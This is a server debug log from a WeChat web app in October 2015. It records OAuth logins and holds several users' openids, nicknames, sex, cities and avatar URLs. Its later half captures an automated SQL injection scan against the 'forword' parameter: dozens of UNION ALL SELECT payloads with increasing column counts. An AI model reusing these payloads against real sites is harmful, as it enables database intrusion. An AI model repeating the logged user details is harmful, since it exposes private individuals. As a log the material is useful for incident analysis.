[2015-10-17 01:15:41][debug] forword：0
[2015-10-17 01:15:42][debug] forword：0
[2015-10-17 01:15:56][debug] --------------------------------------------------------------------
[2015-10-17 01:15:56][debug] 授权成功！
[2015-10-17 01:15:56][debug] 微信用户信息：{"openid":"oXU1ruPqqcz2TqaxwxiSl6230iNA","nickname":"∇哈","sex":2,"language":"zh_CN","city":"嘉兴","province":"浙江","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5ZT3ZczukibL0FyALj4x0T0TgONApFRfkI51ul5RCJPuK52wq40LMyyco7P7vszxmMLEgt9ibLUScvJvf03dhXDS9\/0","privilege":[]}
[2015-10-17 01:15:56][debug] --------------------------------------------------------------------
[2015-10-17 01:15:56][debug] forword：0
[2015-10-17 01:15:57][debug] forword：0
[2015-10-17 01:15:57][debug] forword：0
[2015-10-17 01:16:28][debug] --------------------------------------------------------------------
[2015-10-17 01:16:28][debug] 授权成功！
[2015-10-17 01:16:28][debug] 微信用户信息：{"openid":"oXU1ruPqqcz2TqaxwxiSl6230iNA","nickname":"∇哈","sex":2,"language":"zh_CN","city":"嘉兴","province":"浙江","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5ZT3ZczukibL0FyALj4x0T0TgONApFRfkI51ul5RCJPuK52wq40LMyyco7P7vszxmMLEgt9ibLUScvJvf03dhXDS9\/0","privilege":[]}
[2015-10-17 01:16:28][debug] --------------------------------------------------------------------
[2015-10-17 01:29:16][debug] forword：0
[2015-10-17 06:57:28][debug] forword：0
[2015-10-17 06:57:38][debug] forword：0
[2015-10-17 06:57:39][debug] forword：0
[2015-10-17 06:57:52][debug] forword：0
[2015-10-17 06:58:04][debug] --------------------------------------------------------------------
[2015-10-17 06:58:04][debug] 授权成功！
[2015-10-17 06:58:04][debug] 微信用户信息：{"openid":"oXU1ruNX8nb7eVqGSpfzwVKcFWSM","nickname":"陈立华","sex":2,"language":"zh_CN","city":"海淀","province":"北京","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/ajNVdqHZLLBYQTrWLRkdPhGibyaXlx3ZGuoKYMVakS6iaQeTQG4icsnxWKSYYkwzLZaaJyKywic0S18f4RZTXMwrWQ\/0","privilege":[]}
[2015-10-17 06:58:04][debug] --------------------------------------------------------------------
[2015-10-17 06:58:04][debug] forword：0
[2015-10-17 06:58:33][debug] forword：0
[2015-10-17 09:16:31][debug] forword：0
[2015-10-17 09:16:34][debug] forword：0
[2015-10-17 09:16:46][debug] forword：0
[2015-10-17 09:42:01][debug] forword：0
[2015-10-17 09:42:02][debug] forword：0
[2015-10-17 09:42:07][debug] --------------------------------------------------------------------
[2015-10-17 09:42:07][debug] 授权成功！
[2015-10-17 09:42:07][debug] 微信用户信息：{"openid":"oXU1ruD-dHdP8E2l7_GZifo8x0c4","nickname":"流星","sex":1,"language":"zh_CN","city":"台州","province":"浙江","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/BcQRZIbPSiamFjMicGH9LkqXyt5cvGJZVx8X6bhkoYzOxzJE3ozdZN65TibQMnq2m06NFibrDnOULEsrWfRsBpV4TPIoW0Hpqhq9\/0","privilege":[]}
[2015-10-17 09:42:07][debug] --------------------------------------------------------------------
[2015-10-17 09:42:07][debug] forword：0
[2015-10-17 09:42:07][debug] forword1111：0
[2015-10-17 09:42:08][debug] forword：0
[2015-10-17 09:59:58][debug] forword：0
[2015-10-17 11:46:33][debug] forword：0
[2015-10-17 13:52:45][debug] forword：0
[2015-10-17 13:52:50][debug] --------------------------------------------------------------------
[2015-10-17 13:52:50][debug] 授权成功！
[2015-10-17 13:52:50][debug] 微信用户信息：{"openid":"oXU1ruHMap7OmxMoRaKaeap4dleQ","nickname":"佳佳","sex":2,"language":"zh_CN","city":"秦皇岛","province":"河北","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5bpQFN2Bw5WyYuMhgTPSN0W396HLtaOw2WibAaX9pZy6QuO9AE8qwQFGdZ8zlyIETzKYwOoxiaLOupdyq6MAK76g9\/0","privilege":[]}
[2015-10-17 13:52:50][debug] --------------------------------------------------------------------
[2015-10-17 13:52:50][debug] forword：0
[2015-10-17 13:52:50][debug] forword1111：0
[2015-10-17 13:52:51][debug] bargain_id----->0
[2015-10-17 13:53:13][debug] bargain_id----->0
[2015-10-17 14:46:51][debug] forword：0
[2015-10-17 14:46:51][debug] forword：0
[2015-10-17 14:46:55][debug] forword：0
[2015-10-17 14:46:57][debug] forword：0
[2015-10-17 14:49:13][debug] forword：0
[2015-10-17 14:49:21][debug] --------------------------------------------------------------------
[2015-10-17 14:49:21][debug] 授权成功！
[2015-10-17 14:49:21][debug] 微信用户信息：{"openid":"oXU1ruAmVyiNM2f-N1wFjsYGCi5M","nickname":"幸福像花儿一样","sex":1,"language":"zh_CN","city":"唐山","province":"河北","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5bpQFN2Bw5Wya4Usjac8ettReWtNbWiaBeViaQGBoWqicbsxskZMDfGI3jngOrEHpHMNMkHG3WRLpVCnFnR9vYM3ZZ\/0","privilege":[]}
[2015-10-17 14:49:21][debug] --------------------------------------------------------------------
[2015-10-17 14:49:21][debug] forword：0
[2015-10-17 14:49:32][debug] forword：0
[2015-10-17 14:49:32][debug] forword：0
[2015-10-17 14:49:36][debug] forword：0
[2015-10-17 14:49:44][debug] forword：0
[2015-10-17 14:49:46][debug] forword：0
[2015-10-17 14:57:15][debug] forword：2
[2015-10-17 14:57:15][debug] forword：2
[2015-10-17 14:57:24][debug] --------------------------------------------------------------------
[2015-10-17 14:57:24][debug] 授权成功！
[2015-10-17 14:57:24][debug] 微信用户信息：{"openid":"oXU1ruGO50ca9jekDZlWqJRtXnZw","nickname":"莫文华","sex":1,"language":"zh_CN","city":"镇江","province":"江苏","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/McYMgia19V0Xf7vAJ5sEzqeqIkV9icZ7Y1k7CkcrGDgxv3xEia6VaGblgHGfH7BHqofkvCDlQ4CEXVkCh8eozEcgrpTiaVRKWLKZ\/0","privilege":[]}
[2015-10-17 14:57:24][debug] --------------------------------------------------------------------
[2015-10-17 14:57:24][debug] forword：2
[2015-10-17 14:57:24][debug] forword1111：2
[2015-10-17 14:57:25][debug] bargain_id----->2
[2015-10-17 14:57:26][debug] --------------------------------------------------------------------
[2015-10-17 14:57:26][debug] 授权成功！
[2015-10-17 14:57:26][debug] 微信用户信息：{"errcode":40001,"errmsg":"req id: R3bx.a0646ns55, invalid credential, access_token is invalid or not latest"}
[2015-10-17 14:57:26][debug] --------------------------------------------------------------------
[2015-10-17 14:58:14][debug] bargain_id----->2
[2015-10-17 15:02:59][debug] forword：0
[2015-10-17 15:48:11][debug] forword：0
[2015-10-17 15:48:14][debug] forword：0
[2015-10-17 15:48:16][debug] forword：0
[2015-10-17 15:48:17][debug] forword：0
[2015-10-17 15:48:20][debug] forword：0
[2015-10-17 16:01:47][debug] forword：0
[2015-10-17 18:46:15][debug] forword：0
[2015-10-17 18:46:15][debug] forword：0
[2015-10-17 18:46:15][debug] forword：0
[2015-10-17 21:20:25][debug] forword：
[2015-10-17 21:22:39][debug] forword：
[2015-10-17 22:26:23][debug] forword：
[2015-10-17 22:26:54][debug] forword：
[2015-10-17 22:35:30][debug] forword：0
[2015-10-17 22:35:31][debug] forword：0
[2015-10-17 22:35:31][debug] forword：0)'(")(.",(
[2015-10-17 22:35:32][debug] forword：0
[2015-10-17 22:35:32][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:33][debug] forword：0') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:33][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:34][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:34][debug] forword：0') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:35][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:35][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:35:36][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:36][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:37][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:37][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:37][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:38][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:35:38][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:35:39][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:39][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:40][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:40][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:41][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:41][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:42][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:35:42][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:35:43][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:35:43][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:44][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:44][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:45][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:45][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:46][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:46][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:47][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:35:47][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:35:48][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:35:48][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:35:49][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:49][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:50][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:50][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:51][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:51][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:52][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:52][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:53][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:35:53][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:35:54][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:35:54][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:35:55][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:35:55][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:35:56][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:56][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:57][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:57][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:58][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:58][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:59][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:35:59][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:00][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:00][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:01][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:01][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:02][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:02][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:03][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:03][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:04][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:04][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:05][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:05][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:06][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:06][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:07][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:07][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:08][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:08][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:09][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:09][debug] forword：0
[2015-10-17 22:36:09][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:10][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:10][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:11][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:11][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:12][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:12][debug] forword：0
[2015-10-17 22:36:12][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:13][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:13][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:13][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:14][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:14][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:15][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:15][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:16][debug] forword：0
[2015-10-17 22:36:16][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:16][debug] forword：0' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:17][debug] forword：0' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:17][debug] forword：0' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:18][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:18][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:19][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:19][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:20][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:20][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:21][debug] forword：0' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:21][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:22][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:22][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:23][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:23][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:24][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:24][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:25][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:25][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:26][debug] forword：0') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
